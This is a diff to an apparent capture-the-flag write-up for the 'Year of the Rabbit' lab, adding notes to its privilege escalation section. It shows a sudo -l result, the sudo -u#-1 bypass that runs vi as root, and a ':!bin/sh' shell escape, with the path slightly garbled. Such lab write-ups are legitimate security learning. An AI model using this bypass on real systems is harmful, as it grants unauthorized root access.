@@ -160,25 +160,51 @@ And check the message:<br>
 <img src="./images/year_of_the_rabbit/28.png">
 </center><br><br>
 
+
 <h2><span style="color:red">3. 🔓 Privilege Escalation Part</span></h2><br>
+
 
 We found creds of Login as a gwendoline<br> 
 <center>
 <img src="./images/year_of_the_rabbit/29.png">
 </center><br>
 
-Use ```bash sudo -V``` ```bash sudo -l``` commands to check possibility for privesc:<br>
+
+Use
+```bash
+sudo -V
+```
+```bash
+sudo -l
+```
+commands to check possibility for privesc:<br>
 <center>
 <img src="./images/year_of_the_rabbit/30.png"><br>
 <img src="./images/year_of_the_rabbit/31.png">
-</center><br>
+</center><br><br>
+
+NOTE: sudo -l gave us (ALL, !root)NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt<br>
+It means that vi can be used to make changes as a root user to the user.txt file<br><br>
+
  
 Ok, lets dig what technik we can use with that sudo version:<br>
-<center>
 <img src="./images/year_of_the_rabbit/32.png">
-<img src="./images/year_of_the_rabbit/33.png">
+<img src="./images/year_of_the_rabbit/33.png"><br><br>
+
+
+NOTE: We have the same example on the image but different command which we can run (in our case it's /usr/bin/vi /home/gwendoline/user.txt)
+So what we must do: 
+```bash
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+```
+<br>
+We open a file with "vi" and below when we save it and givving a name we write:
+:!bin/sh
+```
+<br>
 <img src="./images/year_of_the_rabbit/34.png">
-</center><br>
+<br><br>
+
  
 <center>
 <img src="./images/year_of_the_rabbit/35.png">
